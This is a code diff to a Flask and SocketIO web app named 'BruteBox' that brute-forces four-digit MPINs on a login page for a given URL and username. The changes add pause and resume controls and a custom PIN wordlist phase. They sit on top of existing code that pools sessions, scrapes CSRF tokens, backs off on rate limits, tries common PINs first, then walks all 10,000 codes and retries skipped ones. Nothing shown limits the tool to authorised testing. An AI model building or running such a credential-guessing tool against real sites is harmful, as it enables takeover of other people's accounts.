@@ -11,13 +11,16 @@ app.config['SECRET_KEY'] = 'your-secret-key-change-in-production'
 socketio = SocketIO(app, cors_allowed_origins="*")
 
 active_tasks = {}
+pause_events = {}
 
 class WebBruteForcer:
-    def __init__(self, url, username, sid, stop_event):
+    def __init__(self, url, username, sid, stop_event, pause_event, custom_pins=None):
         self.url = url.rstrip('/')
         self.username = username
         self.sid = sid
         self.stop_event = stop_event
+        self.pause_event = pause_event
+        self.custom_pins = custom_pins or []
         self.found = False
         self.attempts = 0
         self.skipped = 0
@@ -25,7 +28,6 @@ class WebBruteForcer:
         self.session_pool = []
         self.pool_lock = threading.Lock()
         self.attempts_lock = threading.Lock()
-        # Security tracking
         self.rate_limit_hits = 0
         self.block_hits = 0
         self.csrf_rotations = 0
@@ -34,6 +36,10 @@ class WebBruteForcer:
 
     def emit_progress(self, event, data):
         socketio.emit(event, data, room=self.sid)
+
+    def wait_if_paused(self):
+        while self.pause_event.is_set() and not self.stop_event.is_set():
+            time.sleep(0.3)
 
     def create_session_pool(self, size=10):
         self.emit_progress('log', {'message': '[INIT] Spawning session pool...', 'type': 'info'})
@@ -54,7 +60,6 @@ class WebBruteForcer:
             csrf_element = soup.find("input", {"name": "_token"})
             if csrf_element:
                 token = csrf_element["value"]
-                # Track CSRF rotation
                 if self.last_csrf and self.last_csrf != token:
                     self.csrf_rotations += 1
                 self.last_csrf = token
@@ -106,17 +111,13 @@ class WebBruteForcer:
             signals.append(f'Moderate response time (~{avg_time:.1f}s avg)')
 
         if score >= 6:
-            rating = 'FORTRESS'
-            color = 'fortress'
+            rating, color = 'FORTRESS', 'fortress'
         elif score >= 4:
-            rating = 'STRONG'
-            color = 'strong'
+            rating, color = 'STRONG', 'strong'
         elif score >= 2:
-            rating = 'MODERATE'
-            color = 'moderate'
+            rating, color = 'MODERATE', 'moderate'
         else:
-            rating = 'WEAK'
-            color = 'weak'
+            rating, color = 'WEAK', 'weak'
 
         return {'rating': rating, 'color': color, 'signals': signals, 'score': score}
 
@@ -124,10 +125,15 @@ class WebBruteForcer:
         if self.found or self.stop_event.is_set():
             return None
 
+        self.wait_if_paused()
+
+        if self.found or self.stop_event.is_set():
+            return None
+
         mpin_str = str(mpin).zfill(4)
 
         session_data = None
-        for attempt in range(3):
+        for _ in range(3):
             session_data = self.get_session_from_pool()
             if session_data:
                 break
@@ -136,7 +142,7 @@ class WebBruteForcer:
         if not session_data:
             with self.attempts_lock:
                 self.skipped += 1
-            self.emit_progress('log', {'message': f'[WARN] Skipped PIN {mpin_str} — no session', 'type': 'warn'})
+            self.emit_progress('log', {'message': f'[WARN] Skipped PIN {mpin_str} -- no session', 'type': 'warn'})
             return None
 
         try:
@@ -180,7 +186,7 @@ class WebBruteForcer:
                     return mpin_str
                 elif response.status_code == 429:
                     self.rate_limit_hits += 1
-                    self.emit_progress('log', {'message': '[RATE] Rate limit hit — throttling...', 'type': 'warn'})
+                    self.emit_progress('log', {'message': '[RATE] Rate limit hit -- throttling...', 'type': 'warn'})
                     session_data = None
                     time.sleep(3)
 
@@ -205,21 +211,40 @@ class WebBruteForcer:
             return
 
         self.emit_progress('log', {'message': '[INIT] BruteBox engine online', 'type': 'info'})
-        self.emit_progress('log', {'message': '[SCAN] Loading common PIN dictionary...', 'type': 'info'})
 
+        # Phase 1: Custom wordlist
+        if self.custom_pins:
+            self.emit_progress('log', {'message': f'[SCAN] Testing {len(self.custom_pins)} custom PINs...', 'type': 'info'})
+            for mpin in self.custom_pins:
+                if self.stop_event.is_set():
+                    self.emit_progress('log', {'message': '[HALT] Operator abort received.', 'type': 'warn'})
+                    return
+                self.wait_if_paused()
+                result = self.try_mpin(mpin)
+                if result:
+                    security = self.get_security_rating()
+                    elapsed = time.time() - self.start_time
+                    self.emit_progress('success', {
+                        'mpin': result, 'attempts': self.attempts,
+                        'elapsed': round(elapsed, 1), 'security': security
+                    })
+                    return
+            self.emit_progress('log', {'message': '[SCAN] Custom list exhausted.', 'type': 'info'})
+
+        # Phase 2: Common PINs
+        self.emit_progress('log', {'message': '[SCAN] Loading common PIN dictionary...', 'type': 'info'})
         for i, mpin in enumerate(common_pins):
             if self.stop_event.is_set():
                 self.emit_progress('log', {'message': '[HALT] Operator abort received.', 'type': 'warn'})
                 return
+            self.wait_if_paused()
             result = self.try_mpin(mpin)
             if result:
                 security = self.get_security_rating()
                 elapsed = time.time() - self.start_time
                 self.emit_progress('success', {
-                    'mpin': result,
-                    'attempts': self.attempts,
-                    'elapsed': round(elapsed, 1),
-                    'security': security
+                    'mpin': result, 'attempts': self.attempts,
+                    'elapsed': round(elapsed, 1), 'security': security
                 })
                 return
             if (i + 1) % 10 == 0:
@@ -227,7 +252,9 @@ class WebBruteForcer:
 
         self.emit_progress('log', {'message': '[SCAN] Dictionary exhausted. Switching to full keyspace...', 'type': 'info'})
 
-        all_mpins = [mpin for mpin in range(10000) if mpin not in common_pins]
+        # Phase 3: Full range
+        tested = set(common_pins) | set(self.custom_pins)
+        all_mpins = [mpin for mpin in range(10000) if mpin not in tested]
         skipped_pins = []
         chunk_size = 100
         chunks = [all_mpins[i:i+chunk_size] for i in range(0, len(all_mpins), chunk_size)]
@@ -236,11 +263,13 @@ class WebBruteForcer:
             if self.stop_event.is_set() or self.found:
                 break
 
+            self.wait_if_paused()
+
             if chunk_idx % 10 == 0:
                 pct = int((chunk_idx / len(chunks)) * 100)
-                bar = '█' * (pct // 5) + '░' * (20 - pct // 5)
+                bar = '#' * (pct // 5) + '.' * (20 - pct // 5)
                 self.emit_progress('log', {
-                    'message': f'[SCAN] {chunk[0]:04d}–{chunk[-1]:04d} |{bar}| {pct}%',
+                    'message': f'[SCAN] {chunk[0]:04d}-{chunk[-1]:04d} [{bar}] {pct}%',
                     'type': 'scan'
                 })
 
@@ -256,10 +285,8 @@ class WebBruteForcer:
                             security = self.get_security_rating()
                             elapsed = time.time() - self.start_time
                             self.emit_progress('success', {
-                                'mpin': result,
-                                'attempts': self.attempts,
-                                'elapsed': round(elapsed, 1),
-                                'security': security
+                                'mpin': result, 'attempts': self.attempts,
+                                'elapsed': round(elapsed, 1), 'security': security
                             })
                             return
                     except concurrent.futures.TimeoutError:
@@ -269,20 +296,20 @@ class WebBruteForcer:
                     except Exception:
                         pass
 
+        # Phase 4: Retry skipped
         if skipped_pins and not self.stop_event.is_set() and not self.found:
             self.emit_progress('log', {'message': f'[RETRY] Re-testing {len(skipped_pins)} flagged PINs...', 'type': 'info'})
             for mpin in skipped_pins:
                 if self.stop_event.is_set() or self.found:
                     break
+                self.wait_if_paused()
                 result = self.try_mpin(mpin)
                 if result:
                     security = self.get_security_rating()
                     elapsed = time.time() - self.start_time
                     self.emit_progress('success', {
-                        'mpin': result,
-                        'attempts': self.attempts,
-                        'elapsed': round(elapsed, 1),
-                        'security': security
+                        'mpin': result, 'attempts': self.attempts,
+                        'elapsed': round(elapsed, 1), 'security': security
                     })
                     return
 
@@ -306,29 +333,44 @@ def handle_disconnect():
     if sid in active_tasks:
         active_tasks[sid].set()
         del active_tasks[sid]
+    if sid in pause_events:
+        del pause_events[sid]
     print('Client disconnected')
 
 @socketio.on('start_bruteforce')
 def handle_start(data):
     url = data.get('url')
     username = data.get('username')
+    custom_raw = data.get('custom_pins', '')
     sid = request.sid
 
     if not url or not username:
         emit('error', {'message': 'URL and username are required'})
         return
 
+    # Parse custom PINs
+    custom_pins = []
+    if custom_raw:
+        for p in custom_raw.replace(',', '\n').splitlines():
+            p = p.strip().zfill(4)
+            if p.isdigit() and len(p) == 4:
+                custom_pins.append(int(p))
+
     if sid in active_tasks:
         active_tasks[sid].set()
 
     stop_event = threading.Event()
+    pause_event = threading.Event()
     active_tasks[sid] = stop_event
+    pause_events[sid] = pause_event
 
     def task():
-        forcer = WebBruteForcer(url, username, sid, stop_event)
+        forcer = WebBruteForcer(url, username, sid, stop_event, pause_event, custom_pins)
         forcer.run()
         if sid in active_tasks:
             del active_tasks[sid]
+        if sid in pause_events:
+            del pause_events[sid]
 
     thread = threading.Thread(target=task)
     thread.daemon = True
@@ -336,9 +378,27 @@ def handle_start(data):
 
     emit('log', {'message': '[INIT] BruteBox engaged...', 'type': 'info'})
 
+@socketio.on('pause_bruteforce')
+def handle_pause():
+    sid = request.sid
+    if sid in pause_events:
+        pause_events[sid].set()
+        emit('log', {'message': '[PAUSE] Operation paused.', 'type': 'warn'})
+        emit('paused')
+
+@socketio.on('resume_bruteforce')
+def handle_resume():
+    sid = request.sid
+    if sid in pause_events:
+        pause_events[sid].clear()
+        emit('log', {'message': '[RESUME] Operation resumed.', 'type': 'info'})
+        emit('resumed')
+
 @socketio.on('stop_bruteforce')
 def handle_stop():
     sid = request.sid
+    if sid in pause_events:
+        pause_events[sid].clear()
     if sid in active_tasks:
         active_tasks[sid].set()
         emit('log', {'message': '[HALT] Stop signal received.', 'type': 'warn'})
